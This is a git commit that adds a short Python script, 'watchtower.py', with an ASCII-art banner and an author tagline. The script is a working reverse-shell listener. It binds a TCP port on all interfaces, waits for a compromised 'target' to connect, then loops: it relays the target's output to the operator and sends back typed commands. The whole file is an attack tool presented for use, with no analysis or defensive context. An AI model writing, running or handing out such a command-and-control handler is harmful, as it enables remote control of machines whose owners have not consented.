d92cdc56efc8c88ae0d3b082373969d7986bfb11
Zeipher <zeipher@localhost.localdomain>
2023-09-14 23:03:44 -0400

    first commit

---
+++ watchtower.py
@@ -0,0 +1,63 @@
+import sys
+import socket
+import time
+import argparse
+import os 
+
+os.system('clear')
+
+asciiart = """ 
+
+     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▄▄▄█████▓ ▒█████   █     █░▓█████  ██▀███  
+▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒
+▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒
+░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  
+░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░░██▒██▓ ░▒████▒░██▓ ▒██▒
+░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░
+  ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░    ░      ░ ▒ ▒░   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░
+  ░   ░    ░   ▒    ░      ░         ░  ░░ ░  ░      ░ ░ ░ ▒    ░   ░     ░     ░░   ░ 
+    ░          ░  ░        ░ ░       ░  ░  ░             ░ ░      ░       ░  ░   ░     
+                           ░                                                           
+"""
+bio = """
+                                by Zeipher21x  
+
+                         'Of Course I Still Love You!'
+
+
+"""
+
+
+print(asciiart)
+print(bio)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-p", "--port", help="Specify the port")
+
+args = parser.parse_args()
+port = int(args.port)
+ip = f"0.0.0.0"
+
+def listen(ip,port):
+  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.bind((ip, port))
+  s.listen(1)
+  print("Listening on port " + str(port))
+  conn, addr = s.accept()
+  print('Connection received from ',addr)
+  while True:
+        #Receive data from the target and get user input
+        ans = conn.recv(1024).decode()
+        sys.stdout.write(ans)
+        command = input()
+
+        #Send command
+        command += "\n"
+        conn.send(command.encode())
+        time.sleep(1)
+
+        #Remove the output of the "input()" function
+        sys.stdout.write("\033[A" + ans.split("\n")[-1])
+
+listen(ip,port)
+  
